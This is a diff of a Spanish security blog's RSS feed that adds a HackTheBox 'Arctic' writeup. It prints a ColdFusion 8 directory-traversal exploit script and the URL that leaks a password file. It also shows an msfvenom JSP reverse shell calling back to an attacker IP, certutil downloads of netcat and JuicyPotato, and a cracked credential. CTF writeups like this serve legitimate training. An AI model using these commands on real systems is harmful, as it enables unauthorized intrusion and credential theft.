@@ -5,12 +5,594 @@
     <description>Articulos, Writeups y Noticias sobre Ciberseguridad</description>
     <link>http://localhost:4000/</link>
     <atom:link href="http://localhost:4000/feed.xml" rel="self" type="application/rss+xml"/>
-    <pubDate>Tue, 11 Apr 2023 05:57:45 +0000</pubDate>
-    <lastBuildDate>Tue, 11 Apr 2023 05:57:45 +0000</lastBuildDate>
+    <pubDate>Tue, 11 Apr 2023 18:30:54 +0000</pubDate>
+    <lastBuildDate>Tue, 11 Apr 2023 18:30:54 +0000</lastBuildDate>
     <generator>Jekyll v3.9.0</generator>
     
       <item>
-        <title>Git</title>
+        <title>Maquina Arctic - htb writeup</title>
+        <description>&lt;p&gt;El dia de hoy vamos a estar resolviendo la maquina &lt;code&gt;Arctic&lt;/code&gt; de &lt;code&gt;hackthebox&lt;/code&gt; que es una maquina &lt;code&gt;Windows&lt;/code&gt; de dificultad &lt;code&gt;Facil&lt;/code&gt;. Para explotar esta maquina abusaremos una vulnerabilidad de &lt;code&gt;Condfusion 8&lt;/code&gt; que nos permitira realizar un &lt;code&gt;directory path traversal&lt;/code&gt; y una vez conectados al &lt;code&gt;Coldfusion&lt;/code&gt; nos arovecharemos de una funcionalidad que tiene para extraer una credencial y crearemos un archivo &lt;code&gt;jsp&lt;/code&gt; malicioso para ganar acceso al sistema y finalmente para escalar privilegios como el usuario &lt;code&gt;administrator&lt;/code&gt; nos aprovecharemos del privilegio &lt;code&gt;Seimpersonateprivilege&lt;/code&gt;.&lt;/p&gt;
+
+&lt;p&gt;Vamos a comenzar como siempre creando un directorio con el nombre de la maquina:&lt;/p&gt;
+
+&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;❯ mkdir Arctic
+❯ ls
+ Arctic
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;❯ which mkt
+mkt () {
+	mkdir {nmap,content,scripts}
+}
+❯ mkt
+❯ ls
+ content   exploits   nmap
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;h2 id=&quot;enumeración&quot;&gt;Enumeración &lt;a href=&quot;#enumeración&quot;&gt;#&lt;/a&gt;&lt;/h2&gt;
+
+&lt;p&gt;Ahora que tenemos nuestros directorios proseguimos con la fase de Enumeracion, empezamos mandando una traza a la ip de la maquina victima con el comando &lt;code&gt;ping&lt;/code&gt;:&lt;/p&gt;
+
+&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;❯ ping -c 1 10.10.10.11
+PING 10.10.10.11 (10.10.10.11) 56(84) bytes of data.
+64 bytes from 10.10.10.11: icmp_seq=1 ttl=127 time=168 ms
+
+--- 10.10.10.11 ping statistics ---
+1 packets transmitted, 1 received, 0% packet loss, time 0ms
+rtt min/avg/max/mdev = 167.800/167.800/167.800/0.000 ms
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;Vemos que la maquina nos responde con un &lt;code&gt;ttl&lt;/code&gt; de &lt;code&gt;127&lt;/code&gt; correspondiente a una maquina &lt;code&gt;windows&lt;/code&gt;, ahora procederemos a el scaneo de puertos con la ayuda de &lt;code&gt;nmap&lt;/code&gt;:&lt;/p&gt;
+
+&lt;h3 id=&quot;escaneo-de-puertos&quot;&gt;Escaneo de Puertos&lt;/h3&gt;
+
+&lt;table&gt;
+  &lt;thead&gt;
+    &lt;tr&gt;
+      &lt;th&gt;Parámetro&lt;/th&gt;
+      &lt;th style=&quot;text-align: left&quot;&gt;Descripción&lt;/th&gt;
+    &lt;/tr&gt;
+  &lt;/thead&gt;
+  &lt;tbody&gt;
+    &lt;tr&gt;
+      &lt;td&gt;&lt;a href=&quot;#enumeracion&quot;&gt;-p-&lt;/a&gt;&lt;/td&gt;
+      &lt;td style=&quot;text-align: left&quot;&gt;Escaneamos todos los 65535 puertos.&lt;/td&gt;
+    &lt;/tr&gt;
+    &lt;tr&gt;
+      &lt;td&gt;&lt;a href=&quot;#enumeracion&quot;&gt;–open&lt;/a&gt;&lt;/td&gt;
+      &lt;td style=&quot;text-align: left&quot;&gt;Solo los puertos que estén abiertos.&lt;/td&gt;
+    &lt;/tr&gt;
+    &lt;tr&gt;
+      &lt;td&gt;&lt;a href=&quot;#enumeracion&quot;&gt;-v&lt;/a&gt;&lt;/td&gt;
+      &lt;td style=&quot;text-align: left&quot;&gt;Permite ver en consola lo que va encontrando (verbose).&lt;/td&gt;
+    &lt;/tr&gt;
+    &lt;tr&gt;
+      &lt;td&gt;&lt;a href=&quot;#enumeracion&quot;&gt;-oG&lt;/a&gt;&lt;/td&gt;
+      &lt;td style=&quot;text-align: left&quot;&gt;Guarda el output en un archivo con formato grepeable para que mediante una funcion de &lt;a href=&quot;https://s4vitar.github.io/&quot;&gt;S4vitar&lt;/a&gt; nos va a permitir extraer cada uno de los puertos y copiarlos sin importar la cantidad en la clipboard y asi al hacer ctrl_c esten disponibles&lt;/td&gt;
+    &lt;/tr&gt;
+  &lt;/tbody&gt;
+&lt;/table&gt;
+
+&lt;p&gt;Procedemos a escanear los puertos abiertos y lo exportaremos al archivo de nombre &lt;code&gt;allPorts&lt;/code&gt;:&lt;/p&gt;
+
+&lt;pre&gt;&lt;code class=&quot;language-java&quot;&gt;❯ nmap -p- --open -sS --min-rate 5000 -vvv -n -Pn 10.10.10.11 -oG openPorts
+Host discovery disabled (-Pn). All addresses will be marked 'up' and scan times may be slower.
+Starting Nmap 7.92 ( https://nmap.org ) at 2023-04-11 15:49 GMT
+Initiating SYN Stealth Scan at 15:49
+Scanning 10.10.10.11 [65535 ports]
+Discovered open port 135/tcp on 10.10.10.11
+Discovered open port 49154/tcp on 10.10.10.11
+Discovered open port 8500/tcp on 10.10.10.11
+Completed SYN Stealth Scan at 15:49, 26.54s elapsed (65535 total ports)
+Nmap scan report for 10.10.10.11
+Host is up, received user-set (0.13s latency).
+Scanned at 2023-04-11 15:49:10 GMT for 27s
+Not shown: 65532 filtered tcp ports (no-response)
+Some closed ports may be reported as filtered due to --defeat-rst-ratelimit
+PORT      STATE SERVICE REASON
+135/tcp   open  msrpc   syn-ack ttl 127
+8500/tcp  open  fmtp    syn-ack ttl 127
+49154/tcp open  unknown syn-ack ttl 127
+
+Read data files from: /usr/bin/../share/nmap
+Nmap done: 1 IP address (1 host up) scanned in 26.67 seconds
+           Raw packets sent: 131085 (5.768MB) | Rcvd: 19 (836B)
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;Podemos ver puertos interesantes que se encuentran abiertos como &lt;code&gt;135 rpc&lt;/code&gt; , &lt;code&gt;8500 fmtp&lt;/code&gt; , &lt;code&gt;445 smb&lt;/code&gt; y &lt;code&gt;49154 unknown - desconocido&lt;/code&gt;.&lt;/p&gt;
+
+&lt;h3 id=&quot;escaneo-de-version-y-servicios&quot;&gt;Escaneo de Version y Servicios.&lt;/h3&gt;
+
+&lt;pre&gt;&lt;code class=&quot;language-java&quot;&gt;❯ nmap -sCV -p 135,8500,49154 10.10.10.11 -oN targets
+Starting Nmap 7.92 ( https://nmap.org ) at 2023-04-11 15:51 GMT
+Nmap scan report for 10.10.10.11
+Host is up (0.29s latency).
+
+PORT      STATE SERVICE VERSION
+135/tcp   open  msrpc   Microsoft Windows RPC
+8500/tcp  open  fmtp?
+49154/tcp open  msrpc   Microsoft Windows RPC
+Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows
+
+Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+Nmap done: 1 IP address (1 host up) scanned in 147.62 seconds
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;Visulizamos la versión de los puertos escaneados:&lt;/p&gt;
+
+&lt;table&gt;
+  &lt;thead&gt;
+    &lt;tr&gt;
+      &lt;th&gt;Puerto&lt;/th&gt;
+      &lt;th&gt;Servicio&lt;/th&gt;
+      &lt;th&gt;Versión&lt;/th&gt;
+    &lt;/tr&gt;
+  &lt;/thead&gt;
+  &lt;tbody&gt;
+    &lt;tr&gt;
+      &lt;td&gt;135&lt;/td&gt;
+      &lt;td&gt;MSRPC&lt;/td&gt;
+      &lt;td&gt;Microsoft Windows RPC&lt;/td&gt;
+    &lt;/tr&gt;
+    &lt;tr&gt;
+      &lt;td&gt;8500&lt;/td&gt;
+      &lt;td&gt;FMTP?&lt;/td&gt;
+      &lt;td&gt; &lt;/td&gt;
+    &lt;/tr&gt;
+    &lt;tr&gt;
+      &lt;td&gt;49154&lt;/td&gt;
+      &lt;td&gt;MSRPC&lt;/td&gt;
+      &lt;td&gt;Microsoft Windows RPC&lt;/td&gt;
+    &lt;/tr&gt;
+  &lt;/tbody&gt;
+&lt;/table&gt;
+
+&lt;h2 id=&quot;explotación&quot;&gt;Explotación &lt;a href=&quot;#explotación&quot;&gt;#&lt;/a&gt;&lt;/h2&gt;
+
+&lt;p&gt;Primero ya que &lt;code&gt;nmap&lt;/code&gt; no detecto el servicio del puerto &lt;code&gt;8500&lt;/code&gt; en vista que nos pregunta si es &lt;code&gt;fmtp?&lt;/code&gt;, puede tratarse de un servicio web, pero como tarda en responder al no encontrar nada no tiene claro el servicio.&lt;/p&gt;
+
+&lt;p&gt;Vamos al navegador y veamos si el servicio es &lt;code&gt;http&lt;/code&gt;, nos tarda un poco pero efectivamente si es un servicio web.&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/assets/images/HTB/htb-writeup-Arctic/arc1.PNG&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;Dentro del dicrectorio &lt;code&gt;CFIDE&lt;/code&gt; vemos nuevos directorios interesantes.&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/assets/images/HTB/htb-writeup-Arctic/arc2.PNG&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;Si ahora vamos al direcotrio &lt;code&gt;administrator&lt;/code&gt;, vemos un panel administrativo de &lt;code&gt;Adobe Coldfusion 8&lt;/code&gt;&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/assets/images/HTB/htb-writeup-Arctic/arc3.PNG&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;Seguidamente veamos con &lt;code&gt;searchsploit&lt;/code&gt; si existen vulnerabilidades asociadas a &lt;code&gt;Adobe coldfusion&lt;/code&gt;.&lt;/p&gt;
+
+&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;❯ searchsploit adobe coldfusion
+----------------------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------
+ Exploit Title                                                                                                                                       |  Path
+----------------------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------
+Adobe ColdFusion - 'probe.cfm' Cross-Site Scripting                                                                                                  | cfm/webapps/36067.txt
+Adobe ColdFusion - Directory Traversal                                                                                                               | multiple/remote/14641.py
+Adobe ColdFusion - Directory Traversal (Metasploit)                                                                                                  | multiple/remote/16985.rb
+Adobe ColdFusion 11 - LDAP Java Object Deserialization Remode Code Execution (RCE)                                                                   | windows/remote/50781.txt
+Adobe Coldfusion 11.0.03.292866 - BlazeDS Java Object Deserialization Remote Code Execution                                                          | windows/remote/43993.py
+Adobe ColdFusion 2018 - Arbitrary File Upload                                                                                                        | multiple/webapps/45979.txt
+Adobe ColdFusion 6/7 - User_Agent Error Page Cross-Site Scripting                                                                                    | cfm/webapps/29567.txt
+Adobe ColdFusion 7 - Multiple Cross-Site Scripting Vulnerabilities                                                                                   | cfm/webapps/36172.txt
+Adobe ColdFusion 8 - Remote Command Execution (RCE)                                                                                                  | cfm/webapps/50057.py
+Adobe ColdFusion 9 - Administrative Authentication Bypass                                                                                            | windows/webapps/27755.txt
+Adobe ColdFusion 9 - Administrative Authentication Bypass (Metasploit)                                                                               | multiple/remote/30210.rb
+Adobe ColdFusion &amp;lt; 11 Update 10 - XML External Entity Injection                                                                                      | multiple/webapps/40346.py
+Adobe ColdFusion APSB13-03 - Remote Multiple Vulnerabilities (Metasploit)                                                                            | multiple/remote/24946.rb
+Adobe ColdFusion Server 8.0.1 - '/administrator/enter.cfm' Query String Cross-Site Scripting                                                         | cfm/webapps/33170.txt
+Adobe ColdFusion Server 8.0.1 - '/wizards/common/_authenticatewizarduser.cfm' Query String Cross-Site Scripting                                      | cfm/webapps/33167.txt
+Adobe ColdFusion Server 8.0.1 - '/wizards/common/_logintowizard.cfm' Query String Cross-Site Scripting                                               | cfm/webapps/33169.txt
+Adobe ColdFusion Server 8.0.1 - 'administrator/logviewer/searchlog.cfm?startRow' Cross-Site Scripting                                                | cfm/webapps/33168.txt
+----------------------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------
+Shellcodes: No Results
+Papers: No Results
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;Vemos que hay varias vulnerabilidades asociadas como una concreta &lt;code&gt;Adobe ColdFusion 8 - Remote Command Execution (RCE)&lt;/code&gt;, que concretamente nos va a automatizar todo un proceso para ganar acceso a la maquina. Pero en este caso ya que vamos a realizar la explotación manualmente usaremos la asociada con &lt;code&gt;Adobe ColdFusion - Directory Traversal&lt;/code&gt;.&lt;/p&gt;
+
+&lt;p&gt;Pasemos a inspeccionar ese exploit y veamos en que consiste.&lt;/p&gt;
+
+&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;❯ searchsploit -x multiple/remote/14641.py
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;Veamos de que trata el exploit&lt;/p&gt;
+
+&lt;pre&gt;&lt;code class=&quot;language-python&quot;&gt;# Working GET request courtesy of carnal0wnage:
+# http://server/CFIDE/administrator/enter.cfm?locale=../../../../../../../../../../ColdFusion8/lib/password.properties%00en
+#
+# LLsecurity added another admin page filename: &quot;/CFIDE/administrator/enter.cfm&quot;
+
+
+#!/usr/bin/python
+
+# CVE-2010-2861 - Adobe ColdFusion Unspecified Directory Traversal Vulnerability
+# detailed information about the exploitation of this vulnerability:
+# http://www.gnucitizen.org/blog/coldfusion-directory-traversal-faq-cve-2010-2861/
+
+# leo 13.08.2010
+
+import sys
+import socket
+import re
+
+# in case some directories are blocked
+filenames = (&quot;/CFIDE/wizards/common/_logintowizard.cfm&quot;, &quot;/CFIDE/administrator/archives/index.cfm&quot;, &quot;/cfide/install.cfm&quot;, &quot;/CFIDE/administrator/entman/index.cfm&quot;, &quot;/CFIDE/administrator/enter.cfm&quot;)
+
+post = &quot;&quot;&quot;POST %s HTTP/1.1
+Host: %s
+Connection: close
+Content-Type: application/x-www-form-urlencoded
+Content-Length: %d
+
+locale=%%00%s%%00a&quot;&quot;&quot;
+
+def main():
+    if len(sys.argv) != 4:
+        print &quot;usage: %s &amp;lt;host&amp;gt; &amp;lt;port&amp;gt; &amp;lt;file_path&amp;gt;&quot; % sys.argv[0]
+        print &quot;example: %s localhost 80 ../../../../../../../lib/password.properties&quot; % sys.argv[0]
+        print &quot;if successful, the file will be printed&quot;
+        return
+
+    host = sys.argv[1]
+    port = sys.argv[2]
+    path = sys.argv[3]
+
+    for f in filenames:
+        print &quot;------------------------------&quot;
+        print &quot;trying&quot;, f
+
+        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+        s.connect((host, int(port)))
+        s.send(post % (f, host, len(path) + 14, path))
+
+        buf = &quot;&quot;
+        while 1:
+            buf_s = s.recv(1024)
+            if len(buf_s) == 0:
+                break
+            buf += buf_s
+
+        m = re.search('&amp;lt;title&amp;gt;(.*)&amp;lt;/title&amp;gt;', buf, re.S)
+        if m != None:
+            title = m.groups(0)[0]
+            print &quot;title from server in %s:&quot; % f
+            print &quot;------------------------------&quot;
+            print m.groups(0)[0]
+            print &quot;------------------------------&quot;
+
+if __name__ == '__main__':
+    main()
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;Podemos ver que esta realizando una petición a &lt;code&gt;http://server/CFIDE/administrator/enter.cfm?locale=../../../../../../../../../../ColdFusion8/lib/password.properties%00en
+&lt;/code&gt; para extraer un archivo local.&lt;/p&gt;
+
+&lt;p&gt;Hagamos eso entonces y en el navegador agreguemos esa petición.&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/assets/images/HTB/htb-writeup-Arctic/arc4.PNG&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;Efectivamente nos realiza un leak de una contraseña encryptada, asi que vallamos a nuestra web de confianza y tratemos de crackearla.&lt;/p&gt;
+
+&lt;ul&gt;
+  &lt;li&gt;&lt;a href=&quot;https://crackstation.net/&quot;&gt;https://crackstation.net/&lt;/a&gt;&lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;p&gt;Logramos obtener la contraseña en texto plano&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/assets/images/HTB/htb-writeup-Arctic/arc5.PNG&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;Ahora que ya contamos de credenciales validas &lt;code&gt;admin:happyday&lt;/code&gt;, vamos a logearnos en el panel.&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/assets/images/HTB/htb-writeup-Arctic/arc6.PNG&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+
+&lt;blockquote&gt;
+  &lt;p&gt;Una vez ganes acceso a un &lt;code&gt;coldfusion&lt;/code&gt; y estes como un usuario administrador al igual que un wordpress o un joomla, se pueden hacer ciertas cosas, para ganar acceso.&lt;/p&gt;
+&lt;/blockquote&gt;
+
+&lt;p&gt;Podemos ir a las opciones de &lt;code&gt;schedule task&lt;/code&gt; para crear una nueva tarea y a &lt;code&gt;mappings&lt;/code&gt; para ver las rutas expuestas.&lt;/p&gt;
+
+&lt;p&gt;En &lt;code&gt;mappings&lt;/code&gt; podemos ver dos rutas expuestas. Siendo una de ellas &lt;code&gt;C:\ColdFusion8\wwwroot\CFIDE&lt;/code&gt;, que corresponde a la ruta que podiamos listar al conectarnos a la pagina. Eso quiere decir que si logramos crear un archivo y meterlo en esa ruta, esta claro que deberia cargarse el archivo en esta parte.&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/assets/images/HTB/htb-writeup-Arctic/arc7.PNG&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;Si ahora nos vamos a &lt;code&gt;schedule task&lt;/code&gt;, podemos crear una tarea programada le damo un nombre. Y la idea es que en &lt;code&gt;URL&lt;/code&gt; podemos emplear un archivo de una fuente que le indiquemos y en &lt;code&gt;File&lt;/code&gt; podemos guardar ese contenido en una ruta dada.&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/assets/images/HTB/htb-writeup-Arctic/arc8.PNG&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;Ahora que tipo de archivos podemos emplear para realizar esto:&lt;/p&gt;
+
+&lt;p&gt;Pues si investigamos un poco acerca de &lt;code&gt;coldfusion&lt;/code&gt; vemos que trabajan con archivos &lt;code&gt;asp&lt;/code&gt;, &lt;code&gt;jsp&lt;/code&gt; o &lt;code&gt;php&lt;/code&gt;&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/assets/images/HTB/htb-writeup-Arctic/arc9.PNG&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;Asi que vamos a intentar crear un archivo &lt;code&gt;JSP&lt;/code&gt; malicioso, para ello usaremos &lt;code&gt;msfvenom&lt;/code&gt;&lt;/p&gt;
+
+&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;❯ msfvenom -l payloads | grep jsp
+    java/jsp_shell_bind_tcp                                            Listen for a connection and spawn a command shell
+    java/jsp_shell_reverse_tcp                                         Connect back to attacker and spawn a command shell
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;Vemos que tenemos un &lt;code&gt;payload&lt;/code&gt; para otorgarnos una &lt;code&gt;shell&lt;/code&gt;, asi que usaremos este payload &lt;code&gt;java/jsp_shell_reverse_tcp&lt;/code&gt; y especificamos nuestra &lt;code&gt;ip&lt;/code&gt; de atacante y el puerto en el cual estaremos en escucha que sera el &lt;code&gt;443&lt;/code&gt;.&lt;/p&gt;
+
+&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;❯ msfvenom -p java/jsp_shell_reverse_tcp LHOST=10.10.16.8 LPORT=443 -o reverse.jsp
+Payload size: 1495 bytes
+Saved as: reverse.jsp
+❯ ls
+ reverse.jsp
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;Una vez tengamos listo el archivo malicioso, vamos a crear la tarea programada.&lt;/p&gt;
+
+&lt;p&gt;Espeficamos el nombre que queramos de la tarea &lt;code&gt;pwnarctic&lt;/code&gt;, en &lt;code&gt;url&lt;/code&gt; le indicamos que se conecte a nuestro equipo con el archivo &lt;code&gt;reverse.jsp&lt;/code&gt; que estaremos alojando y lo guardaremos en la ruta expuesta en la que tenemos acceso de ver los recursos &lt;code&gt;C:\ColdFusion8\wwwroot\CFIDE\reverse.jsp&lt;/code&gt;&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/assets/images/HTB/htb-writeup-Arctic/arc10.PNG&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;Realizamos el &lt;code&gt;submit&lt;/code&gt;&lt;/p&gt;
+
+&lt;p&gt;Lo siguiente sera compartirnos el archivo &lt;code&gt;reverse.jsp&lt;/code&gt; en nuestro equipo, lo haremos con &lt;code&gt;python&lt;/code&gt;&lt;/p&gt;
+
+&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;❯ python3 -m http.server 80
+Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
+
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;Una vez la tarea haya sido creada, para correrla debemos darle al primer boton en verde en la parte de &lt;code&gt;actions&lt;/code&gt;&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/assets/images/HTB/htb-writeup-Arctic/arc11.PNG&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;y vemos que recibo la petición en mi maquina&lt;/p&gt;
+
+&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;❯ python3 -m http.server 80
+Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
+10.10.10.11 - - [11/Apr/2023 17:15:00] &quot;GET /reverse.jsp HTTP/1.1&quot; 200 -
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;Recargamos la ruta en la que teniamos acceso a listar los recursos y genial vemos el &lt;code&gt;reverse.jsp&lt;/code&gt;&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/assets/images/HTB/htb-writeup-Arctic/arc12.PNG&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;Quiere decir que si ahora pinchamos en el archivo &lt;code&gt;reverse.jsp&lt;/code&gt; al interpretarme el servidor el archivo &lt;code&gt;jsp&lt;/code&gt;, deberiamos ganar acceso al sistema.&lt;/p&gt;
+
+&lt;p&gt;Le damos y con &lt;code&gt;ncat&lt;/code&gt; nos ponemos en escucha en el puerto &lt;code&gt;443&lt;/code&gt;, tambien haciendo uso de &lt;code&gt;rlwrap&lt;/code&gt; para obtener una consola mas interactiva.&lt;/p&gt;
+
+&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;❯ rlwrap ncat -nlvp 443
+Ncat: Version 7.92 ( https://nmap.org/ncat )
+Ncat: Listening on :::443
+Ncat: Listening on 0.0.0.0:443
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;Esperamos unos segundos y ganamos acceso al sistema como el usuario &lt;code&gt;tolis&lt;/code&gt;&lt;/p&gt;
+
+&lt;pre&gt;&lt;code class=&quot;language-cmd&quot;&gt;❯ rlwrap ncat -nlvp 443
+Ncat: Version 7.92 ( https://nmap.org/ncat )
+Ncat: Listening on :::443
+Ncat: Listening on 0.0.0.0:443
+Ncat: Connection from 10.10.10.11.
+Ncat: Connection from 10.10.10.11:49672.
+Microsoft Windows [Version 6.1.7600]
+Copyright (c) 2009 Microsoft Corporation.  All rights reserved.
+
+whoami
+whoami
+arctic\tolis
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;Si ahora nos vamos a la raiz del sistema y buscamos la primera flag de forma recursiva, vemos que se encuentra en el direcotrio personal del usuario, la leemos y habriamos obtenido la primera flag &lt;code&gt;user.txt&lt;/code&gt;&lt;/p&gt;
+
+&lt;pre&gt;&lt;code class=&quot;language-cmd&quot;&gt;cd C:\
+cd C:\
+
+dir /r /s user.txt
+dir /r /s user.txt
+ Volume in drive C has no label.
+ Volume Serial Number is 5C03-76A8
+
+ Directory of C:\Users\tolis\Desktop
+
+13/04/2023  02:35                 34 user.txt
+               1 File(s)             34 bytes
+
+     Total Files Listed:
+               1 File(s)             34 bytes
+               0 Dir(s)   1.434.173.440 bytes free
+
+type C:\Users\tolis\Desktop\user.txt
+type C:\Users\tolis\Desktop\user.txt
+b2d38d2f34b46b4189d147c805813fa4
+&lt;/code&gt;&lt;/pre&gt;
+&lt;h2 id=&quot;escalada-de-privilegios&quot;&gt;Escalada de Privilegios &lt;a href=&quot;#escalada-de-privilegios&quot;&gt;#&lt;/a&gt;&lt;/h2&gt;
+
+&lt;p&gt;Veamos que privilegios tenemos como el usuario &lt;code&gt;tolis&lt;/code&gt;, para ello usaremos el comando &lt;code&gt;whoami /priv&lt;/code&gt;&lt;/p&gt;
+
+&lt;pre&gt;&lt;code class=&quot;language-cmd&quot;&gt;whoami /priv
+
+PRIVILEGES INFORMATION
+----------------------
+
+Privilege Name                Description                               State   
+============================= ========================================= ========
+SeChangeNotifyPrivilege       Bypass traverse checking                  Enabled 
+SeImpersonatePrivilege        Impersonate a client after authentication Enabled 
+SeCreateGlobalPrivilege       Create global objects                     Enabled 
+SeIncreaseWorkingSetPrivilege Increase a process working set            Disabled
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;Tenemos habilitado el &lt;code&gt;seImpersonatePrivilege&lt;/code&gt;, podemos explotarlo de muchas formas, pero en esta ocasión lo haremos de una comoda:&lt;/p&gt;
+
+&lt;p&gt;Primero vamos a descargarnos el &lt;code&gt;JuicyPotato&lt;/code&gt; del repositorio de &lt;code&gt;github&lt;/code&gt;&lt;/p&gt;
+
+&lt;ul&gt;
+  &lt;li&gt;&lt;a href=&quot;https://github.com/ohpe/juicy-potato&quot;&gt;https://github.com/ohpe/juicy-potato&lt;/a&gt;&lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;p&gt;Nos vamos a los releases y concretamente nos descargamos el &lt;code&gt;juicyPotato.exe&lt;/code&gt;&lt;/p&gt;
+
+&lt;p&gt;Ahora nos vamos a descargar el ejecutable de &lt;code&gt;ntcat&lt;/code&gt; para &lt;code&gt;windowns&lt;/code&gt; del siguiente enlace, concretamente la versión &lt;code&gt;1.12&lt;/code&gt;, debemos descomprimirlo y usar el &lt;code&gt;nc.64.exe&lt;/code&gt;&lt;/p&gt;
+
+&lt;ul&gt;
+  &lt;li&gt;&lt;a href=&quot;https://eternallybored.org/misc/netcat/&quot;&gt;https://eternallybored.org/misc/netcat/&lt;/a&gt;&lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;p&gt;Una vez tengamos ambos archivos, vamos a proceder a subirlos a la maquina victima&lt;/p&gt;
+
+&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;❯ ls
+ JuicyPotato.exe   nc64.exe   reverse.jsp
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;Para subirlos nos compartiremos un servicio con &lt;code&gt;python3&lt;/code&gt; y en la maquina victima haremos uso de &lt;code&gt;certutil.exe&lt;/code&gt;, para descargarnos los archivos, no debemos olvidar que debemos irnos a una ruta en la cual tengamos permisos como &lt;code&gt;C:\Windows\Temp&lt;/code&gt;&lt;/p&gt;
+
+&lt;pre&gt;&lt;code class=&quot;language-cmd&quot;&gt;cd C:\Windows\Temp
+cd C:\Windows\Temp
+
+mkdir Privesc
+mkdir Privesc
+
+cd Privesc
+cd Privesc
+
+C:\Windows\Temp\Privesc&amp;gt;
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;Ejecutamos &lt;code&gt;certutil.exe&lt;/code&gt;&lt;/p&gt;
+
+&lt;pre&gt;&lt;code class=&quot;language-cmd&quot;&gt;certutil.exe -f -urlcache -split http://10.10.16.8/nc64.exe nc64.exe
+certutil.exe -f -urlcache -split http://10.10.16.8/nc64.exe nc64.exe
+****  Online  ****
+  0000  ...
+  b0d8
+CertUtil: -URLCache command completed successfully.
+
+certutil.exe -f -urlcache -split http://10.10.16.8/JuicyPotato.exe JuicyPotato.exe
+certutil.exe -f -urlcache -split http://10.10.16.8/JuicyPotato.exe JuicyPotato.exe
+****  Online  ****
+  000000  ...
+  054e00
+CertUtil: -URLCache command completed successfully.
+
+C:\Windows\Temp\Privesc&amp;gt;
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;y recibimos la petición en nuestra maquina&lt;/p&gt;
+
+&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;❯ python3 -m http.server 80
+Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
+10.10.10.11 - - [11/Apr/2023 17:59:47] &quot;GET /nc64.exe HTTP/1.1&quot; 200 -
+10.10.10.11 - - [11/Apr/2023 17:59:50] &quot;GET /nc64.exe HTTP/1.1&quot; 200 -
+10.10.10.11 - - [11/Apr/2023 18:00:02] &quot;GET /JuicyPotato.exe HTTP/1.1&quot; 200 -
+10.10.10.11 - - [11/Apr/2023 18:00:04] &quot;GET /JuicyPotato.exe HTTP/1.1&quot; 200 -
+&lt;/code&gt;&lt;/pre&gt;
+
